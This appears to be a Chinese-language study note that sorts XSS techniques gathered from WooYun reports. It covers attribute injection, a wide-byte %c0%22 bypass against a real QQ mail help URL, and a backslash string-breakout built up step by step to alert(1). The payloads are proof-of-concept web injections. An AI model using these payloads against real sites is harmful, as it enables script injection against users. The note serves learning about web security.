#XSS 分类

#### 整理自乌云

- 什么都没过滤的情况
- 输出在`<script><script/>`之间的

    `new Image().src="..."` 或者 `<script>alert(1)</script>`

- 输出在html里的

    `http://xxx.com/search?word=hehe`

    ```html
    <input type="text" value="hehe">
    ```

    修改为 `http://xxx.com/search?word=hehe" onclick="alert(1)`

    则变成
    ```html
    <input type="text" value="hehe" onclick="alert(1)">
    ```

- 宽字节注入

    URL 编码简介
    | sp  | "   |  '  |  ,  |  ;  |  <  |  >  |  ?  |  [  |
    | --- | --- | --- | --- | --- | --- | --- | --- | --- |
    | %20 | %22 | %27 | %2C | %3B | %3C | %3E | %3F | %5B |


    |  ]  |  {  |  o  |  }  | 
    | --- | --- | --- | --- |
    | %5D | %7B | %7C | %7D |

    | newline |    [   |    ]   |  &#124; |
    | ------- | ------ | ------ | ------- |
    |  space  | \&#91; | \&#93; | \&#124; |

    
    `http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa`
    中 `%22` 代表 `"`, 但是最后被过滤为 `&quot;`：
    ```js
    var gsTest = "&quot;;alert(1);//aaaaaa";
    ```
    预想效果:
    ```js
    var gsTest = "";alert(1);//aaaaaa";
    ```

    当html为gbxxxx系列编码时，改为如下:
    
    `http://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%c0%22;alert(1);//aaaaaa`
    
    效果： 
    ```js
    var gsTest= "宽";alert(1);//aaaaaa
    ```
    我试了在console里试了` decodeURI('%C0%5C') `等各种组合还是不明白真相...

    作者解释：至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。
    并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c （怎么吃的啊T^T）

- 反斜杠

    ```js
    location.href="........."+"&ss=aaaa"+"&from=bbb"+"&param=";//comment
    ```
    可以用反斜杠 `\` 杀死 `"`，改成
    ```js
    location.href="........."+"&ss=aaaa\"+"&from=1//"+"&param=";
    ```
    问题： "字符串"&from=1，这样是错误的，因为&符号的优先级高， ("字符串"&from)=1 是无法进行这种赋值操作，继续修改 
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1//"+"&param=";
    ```
    问题： from未定义，加一个函数定义（js会先解析定义），继续修改
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1;function from(){}//"+"&param=";
    ```
    问题： 空格被转义为了 `&nbsp;`， /**/替换空格，继续修改 
    ```js
    location.href="........."+"&ss=aaaa\"+"&from==1;alert(1);function/**/from(){}//"+"&param=";
    ```